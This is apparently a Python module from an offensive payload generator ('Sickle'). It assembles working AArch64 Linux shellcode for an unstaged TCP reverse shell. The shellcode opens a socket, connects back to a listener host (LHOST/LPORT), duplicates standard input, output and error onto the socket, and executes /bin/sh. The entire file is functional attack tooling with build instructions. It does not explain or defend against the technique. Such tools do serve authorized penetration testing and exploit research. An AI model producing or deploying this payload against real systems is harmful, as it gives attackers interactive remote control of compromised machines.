import sys
import ctypes
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.reversing import mappings

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.linux import (
    net,
    netinet_in,
    bits_socket,
)

class Shellcode():

    arch = 'aarch64'

    platform = "linux"

    name = "Linux (AARCH64 or ARM64) SH Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Debian 14.2.0-6"]

    summary = "Reverse Shell via TCP over IPv4 that provides an interactive /bin/sh"
    summary += " session"

    description = ("TCP-based reverse shell over IPv4 that provides an interactive /bin/sh"
                   " session. Since this payload is not staged, there is no need for anything"
                   " more than a Netcat listener.")

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.syscalls = mappings.get_linux_syscalls(["socket",
                                                     "connect",
                                                     "dup3",
                                                     "execve"])

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        sin_addr = convert.ip_str_to_inet_addr(argv_dict['LHOST'])
        sin_port = convert.port_str_to_htons(lport)

        source_code = f"""
_start:

create_sockfd:
    // int socket(int domain,   // x0
    //            int type,     // x1
    //            int protocol) // x2
    mov x0, #{bits_socket.AF_INET}
    mov x1, #{bits_socket.SOCK_STREAM}
    mov x2, #{netinet_in.IPPROTO_IP}
    mov x8, #{self.syscalls['socket']}
    svc #1337
    
    mov x19, x0 // save the returned sockfd into x19

connect:
    // int connect(int sockfd,                  // x0
    //             const struct sockaddr *addr, // x1
    //             socklen_t addrlen);          // x2
    sub sp, sp, #16
    mov w0, #{bits_socket.AF_INET}
    str w0, [sp]
    mov w0, #{sin_port}
    strh w0, [sp, #2]
    ldr w0, ={sin_addr}
    str w0, [sp, #4]
    mov x0, x19
    mov x1, sp
    mov x2, #{ctypes.sizeof(netinet_in.sockaddr)}
    mov x8, #{self.syscalls['connect']}
    svc #1337

start_loop:
    // while (i != 0) {{
    //     i--;
    //     dup3(int oldfd,  // x0
    //          int newfd,  // x1
    //          int flags); // x2
    // }}
    mov x21, #0
    mov x21, #3

    // STDIN, STDOUT, STDERR
change_fd:
    sub x21, x21, #1

dup2:
    mov x0, x19
    mov x1, x21
    mov x2, #0
    mov x8, #{self.syscalls['dup3']}
    svc #1337

    cmp x21, 0
    bne change_fd

execve:
    // int execve(const char *pathname,          // x0
    //            char *const _Nullable argv[],  // x1
    //            char *const _Nullable envp[]); // x2
    ldr x3, =0x68732f6e69622f
    str x3, [sp, #-8]!
    mov x0, sp
    mov x1, #0
    mov x2, #0
    mov x8, #{self.syscalls['execve']}
    svc #1337
        """

        return source_code

    def get_shellcode(self):

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
